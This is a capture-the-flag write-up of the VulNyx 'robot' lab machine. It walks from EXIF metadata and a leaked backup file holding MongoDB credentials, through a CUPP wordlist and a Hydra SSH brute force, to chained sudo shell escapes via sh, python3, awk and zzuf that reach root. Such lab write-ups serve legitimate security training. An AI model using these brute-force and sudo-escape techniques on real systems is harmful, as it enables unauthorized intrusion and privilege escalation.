# robot

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| robot | d4t4s3c | Low | VulNyx |

**Summary:** The robot machine, themed after Mr Robot, exposed SSH, a web server titled "Hello Friend", and an open MongoDB instance on port 27017. A JPEG on the web server hid a directory name in its EXIF comment field, `B4ckUp_3LLi0t/`, and feroxbuster against that backup directory uncovered a `connect.bak` PHP source file containing the credentials for the MongoDB service: user `mongo`, password `m0ng0P4zz`. Authenticated to MongoDB, a collection named after the main character held an `elliot` document with Elliot Alderson's personal data. That data fed CUPP, the personal wordlist generator, which produced a tailored dictionary that Hydra used to brute force the SSH account `elliot`, recovering the password `toillE71986` and a shell. From there, the box was a chain of four chained sudo misconfigurations, each user able to run a privileged binary as the next: `elliot` ran `sh` as `darlene`, `darlene` ran `python3` as `angela`, `angela` ran `awk` as `tyrell`, and finally `tyrell` ran `zzuf` as `root`. Each GTFOBins-style escape hop-by-hop climbed to a root shell, and both flags were read.

---

## Reconnaissance

The engagement opened with the standard host discovery sweep and service scans.

1. The target was located at `192.168.56.119`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 23:09 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00046s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0010s latency).
MAC Address: 08:00:27:87:C1:A4 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.119 (192.168.56.119)
Host is up (0.00099s latency).
MAC Address: 08:00:27:2F:15:2E (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 6.00 seconds
                                                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.119

┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -T4 --min-rate=5000 -Pn $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 23:17 -0400
Nmap scan report for 192.168.56.119 (192.168.56.119)
Host is up (0.0022s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
27017/tcp open  mongod
MAC Address: 08:00:27:2F:15:2E (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 14.43 seconds
                                                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p 22,80,27017 -sC -sV -T4 -Pn $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 23:18 -0400
Nmap scan report for 192.168.56.119 (192.168.56.119)
Host is up (0.0089s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp    open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Hello Friend
27017/tcp open  mongodb MongoDB 5.0.21 4.1.1 - 5.0
| mongodb-info: 
|   MongoDB Build info
|     ok = 1.0
|     storageEngines
|       2 = wiredTiger
|       1 = ephemeralForTest
|       0 = devnull
|     javascriptEngine = mozjs
|     openssl
|       running = OpenSSL 1.1.1n  15 Mar 2022
|       compiled = OpenSSL 1.1.1n  15 Mar 2022
|     allocator = tcmalloc
|     sysInfo = deprecated
|     bits = 64
|     gitVersion = 4fad44a858d8ee2d642566fc8872ef410f6534e4
|     maxBsonObjectSize = 16777216
|     debug = false
|     buildEnvironment
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -fsized-deallocation -std=c++17
|       cppdefines = SAFEINT_USE_INTRINSICS 0 PCRE_STATIC NDEBUG _XOPEN_SOURCE 700 _GNU_SOURCE _FORTIFY_SOURCE 2 BOOST_THREAD_VERSION 5 BOOST_THREAD_USES_DATETIME BOOST_SYSTEM_NO_DEPRECATED BOOST_MATH_NO_LONG_DOUBLE_MATH_FUNCTIONS BOOST_ENABLE_ASSERT_DEBUG_HANDLER BOOST_LOG_NO_SHORTHAND_NAMES BOOST_LOG_USE_NATIVE_SYSLOG BOOST_LOG_WITHOUT_THREAD_ATTR ABSL_FORCE_ALIGNED_ACCESS
|       cc = /opt/mongodbtoolchain/v3/bin/gcc: gcc (GCC) 8.5.0
|       ccflags = -Werror -include mongo/platform/basic.h -ffp-contract=off -fasynchronous-unwind-tables -ggdb -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -fno-omit-frame-pointer -fno-strict-aliasing -O2 -march=sandybridge -mtune=generic -mprefer-vector-width=128 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-const-variable -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -Wa,--nocompress-debug-sections -fno-builtin-memcmp
|       cxx = /opt/mongodbtoolchain/v3/bin/g++: g++ (GCC) 8.5.0
|       linkflags = -Wl,--fatal-warnings -pthread -Wl,-z,now -fuse-ld=gold -fstack-protector-strong -Wl,--no-threads -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro -Wl,--compress-debug-sections=none -Wl,-z,origin -Wl,--enable-new-dtags
|       target_os = linux
|       distmod = debian10
|       distarch = x86_64
|       target_arch = x86_64
|     versionArray
|       3 = 0
|       2 = 21
|       1 = 0
|       0 = 5
|     version = 5.0.21
|     modules
|   Server status
|     code = 13
|     ok = 0.0
|     errmsg = command serverStatus requires authentication
|_    codeName = Unauthorized
| mongodb-databases: 
|   code = 13
|   ok = 0.0
|   errmsg = command listDatabases requires authentication
|_  codeName = Unauthorized
MAC Address: 08:00:27:4F:38:80 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
```

The MongoDB instance on port 27017 refused `serverStatus` and `listDatabases` without authentication, but the HTTP server titled "Hello Friend" looked like the more promising starting point.

---

## Initial Access

### The EXIF Comment

2. The web server's image was downloaded and its metadata examined:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ wget http://$ip/image.jpg                                                  
--2026-08-13 23:13:12--  http://192.168.56.119/image.jpg
Connecting to 192.168.56.119:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 681686 (666K) [image/jpeg]
Saving to: ‘image.jpg’

image.jpg                     100%[==============================================>] 665.71K  --.-KB/s    in 0.06s   

2026-08-13 23:13:12 (10.1 MB/s) - ‘image.jpg’ saved [681686/681686]

┌──(kali㉿kali)-[~/nyx]
└─$ exiftool image.jpg 
ExifTool Version Number         : 13.55
File Name                       : image.jpg
File Size                       : 682 kB
File Modification Date/Time     : 2023:10:06 08:50:53-04:00
File Access Date/Time           : 2026:08:13 23:13:38-04:00
File Inode Change Date/Time     : 2026:08:13 23:13:12-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Comment                         : B4ckUp_3LLi0t/
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1920x1080
Megapixels                      : 2.1
```

The `Comment` field leaked a path: `B4ckUp_3LLi0t/`, apparently a backup directory.

3. feroxbuster was pointed at the leaked directory:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ feroxbuster -u http://$ip/B4ckUp_3LLi0t/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,jpg,png,zip,bak,swp
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.119/B4ckUp_3LLi0t
 🚩  In-Scope Url          │ 192.168.56.119
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, jpg, png, zip, bak, swp]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      324c http://192.168.56.119/B4ckUp_3LLi0t => http://192.168.56.119/B4ckUp_3LLi0t/
200      GET     2577l    15656w  1241203c http://192.168.56.119/B4ckUp_3LLi0t/image.jpg
200      GET       25l       40w      481c http://192.168.56.119/B4ckUp_3LLi0t/index.html
400      GET       10l       35w      306c http://192.168.56.119/B4ckUp_3LLi0t/%EF%BF%BD%EF%BF%BD@N%EF%BF%BD%EF%BF%BD%EF%BF%BD8%EF%BF%BD2%EF%BF%BD%EF%BF%BDi%EF%BF%BD%EF%BF%BD%EF%BF%BD%pE%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BDx%EF%BF%BDR%EF%BF%BD
200      GET       13l       27w      266c http://192.168.56.119/B4ckUp_3LLi0t/connect.bak
```

A file named `connect.bak` stood out.

4. The backup file turned out to be a PHP script containing database connection credentials:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ wget http://$ip/B4ckUp_3LLi0t/connect.bak
--2026-08-13 23:26:05--  http://192.168.56.119/B4ckUp_3LLi0t/connect.bak
Connecting to 192.168.56.119:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 266 [application/x-trash]
Saving to: ‘connect.bak’

connect.bak                   100%[==============================================>]     266  --.-KB/s    in 0s      

2026-08-13 23:26:05 (9.55 MB/s) - ‘connect.bak’ saved [266/266]

                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ file connect.bak   
connect.bak: PHP script, ASCII text
                                                                                      
┌──(kali㉿kali)-[~/nyx]
└─$ cat connect.bak    
<?php

$client = new MongoDB\Client(
    'mongodb://127.0.0.1:27017'
    [
        'username' => 'mongo',
        'password' => 'm0ng0P4zz',
        'ssl' => true,
        'replicaSet' => 'myReplicaSet',
        'authSource' => 'admin',
        'db' => 'elliot',
    ],
);
```

The credentials `mongo:m0ng0P4zz` against the `elliot` database were recovered.

### MongoDB Dump and the CUPP Dictionary

5. Authenticating to MongoDB with those credentials revealed a collection containing the target's personal data:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ mongo --host $ip --port 27017 -u mongo -p 'm0ng0P4zz' --authenticationDatabase elliot elliot
MongoDB shell version v7.0.14
connecting to: mongodb://192.168.56.119:27017/elliot?authSource=elliot&compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("926c4cd4-7ca2-4c22-91c2-f6dcafd903cd") }
MongoDB server version: 5.0.21
WARNING: shell and server versions do not match
================
Warning: the "mongo" shell has been superseded by "mongosh",
which delivers improved usability and compatibility.The "mongo" shell has been deprecated and will be removed in
an upcoming release.
For installation instructions, see
https://docs.mongodb.com/mongodb-shell/install/
================
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        https://docs.mongodb.com/
Questions? Try the MongoDB Developer Community Forums
        https://community.mongodb.com
> show collections
elliot
> db.elliot.find().pretty()
{
        "_id" : ObjectId("651fdd9171f44c265b976d17"),
        "FirstName" : "Elliot",
        "Surname" : "Alderson",
        "Nickname" : "MrRobot",
        "Birthdate" : "17091986"
}
```

The database held the personal profile of Elliot Alderson, a strong hint that the SSH username was `elliot` and that a tailored password list could be built from the leaked profile.

6. CUPP generated a personalized wordlist from the leaked details:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ python3 -W ignore /usr/bin/cupp -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Elliot
> Surname: Alderson
> Nickname: MrRobot
> Birthdate (DDMMYYYY): 17091986


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: 
> Do you want to add special chars at the end of words? Y/[N]: 
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]: 

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to elliot.txt, counting 1398 words.
[+] Now load your pistolero with elliot.txt and shoot! Good luck!
```

7. Hydra ran the generated dictionary against the SSH service for the user `elliot`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ hydra -l elliot -P elliot.txt ssh://$ip -t 64 -I                    
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-13 23:35:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 1398 login tries (l:1/p:1398), ~22 tries per task
[DATA] attacking ssh://192.168.56.119:22/
[STATUS] 567.00 tries/min, 567 tries in 00:01h, 860 to do in 00:02h, 35 active
[STATUS] 529.00 tries/min, 1058 tries in 00:02h, 369 to do in 00:01h, 35 active
[22][ssh] host: 192.168.56.119   login: elliot   password: toillE71986
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 29 final worker threads did not complete until end.
[ERROR] 29 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-13 23:37:23
```

The password `toillE71986` was recovered.

8. SSH login succeeded as `elliot`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ ssh elliot@$ip
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
elliot@192.168.56.119's password: 
elliot@robot:~$ id;whoami
uid=1000(elliot) gid=1000(elliot) grupos=1000(elliot)
elliot
```

A foothold as `elliot` was established.

---

## Privilege Escalation

The box used a daisy chain of sudo misconfigurations: each user was permitted to run a single binary as the next user in the chain, and each binary offered a shell-escape to jump to the next account.

9. `elliot` could run `/usr/bin/sh` as `darlene`:

```bash
elliot@robot:~$ sudo -l
Matching Defaults entries for elliot on robot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User elliot may run the following commands on robot:
    (darlene) NOPASSWD: /usr/bin/sh
elliot@robot:~$ sudo -u darlene sh
$ id
uid=1001(darlene) gid=1001(darlene) grupos=1001(darlene)
```

10. From `darlene`, `python3` was run as `angela`, using its PTY module to spawn an interactive shell:

```bash
$ sudo -u angela /usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
angela@robot:/home/darlene$ id
uid=1002(angela) gid=1002(angela) grupos=1002(angela)
angela@robot:/home/darlene$ cd
angela@robot:~$ sudo -l
Matching Defaults entries for angela on robot:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User angela may run the following commands on robot:
    (tyrell) NOPASSWD: /usr/bin/awk
angela@robot:~$ sudo -u tyrell /usr/bin/awk 'BEGIN {system("/bin/sh")}'
$ id
uid=1003(tyrell) gid=1003(tyrell) grupos=1003(tyrell)
$ sudo -l
Matching Defaults entries for tyrell on robot:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tyrell may run the following commands on robot:
    (root) NOPASSWD: /usr/bin/zzuf

```

11. `angela` ran `awk` as `tyrell`, abusing awk's `BEGIN {system(...)}` to launch a shell. As `tyrell`, the final privilege allowed running `/usr/bin/zzuf` as root. zzuf executes a given command while fuzzing it, but it passes its arguments through intact, so `/bin/bash` was simply handed to it:

```bash
$ sudo -u root zzuf /bin/bash
id;whoami;hostname 
uid=0(root) gid=0(root) grupos=0(root)
root
robot
cat /home/elliot/user.txt /root/root.txt
```

The `zzuf` escape produced a root shell, and the user and root flags were read to complete the compromise.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep isolated the target at `192.168.56.119`, and Nmap exposed SSH on port 22, a web server on port 80, and an authenticated MongoDB instance on port 27017.

2. **Vulnerability Discovery**: EXIF metadata on the web server's `image.jpg` leaked the path `B4ckUp_3LLi0t/`. feroxbuster against that directory found `connect.bak`, a PHP source file exposing MongoDB credentials (`mongo:m0ng0P4zz`).

3. **Exploitation**: Authenticated to MongoDB, an `elliot` collection yielded the profile of Elliot Alderson (FirstName, Surname, Nickname, Birthdate). CUPP generated a personalized wordlist, and Hydra cracked the SSH password `toillE71986`, granting access as `elliot`.

4. **Lateral Movement**: A chain of sudo misconfigurations escalated through four accounts, each running a privileged binary as the next user: `elliot` → `sh` → `darlene`, `darlene` → `python3 -c 'import pty;pty.spawn(...)'` → `angela`, `angela` → `awk 'BEGIN {system(...)}'` → `tyrell`.

5. **Privilege Escalation**: `tyrell` could run `/usr/bin/zzuf` as root without a password. Running `sudo -u root zzuf /bin/bash` passed `/bin/bash` through to spawn a root shell, allowing both flags to be read.